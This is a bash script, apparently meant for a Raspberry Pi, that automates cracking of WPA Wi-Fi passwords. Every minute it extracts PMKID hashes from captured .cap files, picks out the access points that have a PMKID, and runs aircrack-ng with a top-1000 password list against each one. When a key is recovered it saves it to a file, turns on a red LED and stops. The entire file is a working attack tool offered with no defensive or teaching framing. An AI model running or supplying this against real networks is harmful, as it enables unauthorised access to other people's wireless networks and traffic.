#!/bin/bash

while sleep 60
do
    for pcap in *.cap
    do
        echo "$pcap"
        hcxpcapngtool "$pcap" --pmkid=/tmp/m1.pmkid
        hcxhash2cap --pmkid=/tmp/m1.pmkid -c /tmp/out-pmkid.pcap

        for bssid in $(echo 0 | aircrack-ng "/tmp/out-pmkid.pcap" | grep 'with PMKID' | awk '{print $2}')
        do
            if [ -f "/tmp/$bssid" ]; then
                continue
            fi
            touch "/tmp/$bssid"
            aircrack-ng -w /home/pi/wpapsk/passwords_top1k.txt -b "$bssid" \
                "/tmp/out-pmkid.pcap" -l "$bssid.txt"
            if [ -s "$bssid.txt" ]; then
                led red on 2> /dev/null
                exit
            fi
        done

        rm -f /tmp/m1.pmkid
        rm -f /tmp/out-pmkid.pcap
    done
done
